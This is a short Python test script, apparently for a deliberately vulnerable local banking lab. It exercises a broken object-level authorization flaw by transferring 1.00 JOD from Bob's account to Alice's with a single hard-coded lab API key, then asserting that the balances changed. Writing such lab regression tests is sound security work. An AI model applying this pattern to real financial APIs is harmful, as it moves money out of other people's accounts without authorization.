#!/usr/bin/env python3
"""Mutates synthetic local balances: transfers 1.00 JOD from Bob (#2) to Alice (#1)."""
import json
from urllib.request import Request, urlopen, ProxyHandler, build_opener
BASE = "http://127.0.0.1:8080"
KEY = "VULNBANK_LAB_KEY_123"
client = build_opener(ProxyHandler({}))

def call(path, body=None):
    headers = {"X-API-Key": KEY, "Content-Type": "application/json"}
    req = Request(BASE + path, data=None if body is None else json.dumps(body).encode(), headers=headers)
    with client.open(req, timeout=10) as resp:
        return resp.status, json.load(resp)

before_alice=call('/api/v1/accounts/1')[1]['balance']
before_bob=call('/api/v1/accounts/2')[1]['balance']
status, transfer=call('/api/v1/transfers', {'fromAccountId':2,'toAccountId':1,'amount':1.00,'note':'BOLA API regression test'})
after_alice=call('/api/v1/accounts/1')[1]['balance']
after_bob=call('/api/v1/accounts/2')[1]['balance']
assert status==201 and transfer['success']
assert round(after_alice-before_alice,2)==1.00
assert round(before_bob-after_bob,2)==1.00
print(f"[PASS] transfer #{transfer['transferId']}; Alice +1.00; Bob -1.00 (synthetic balances)")
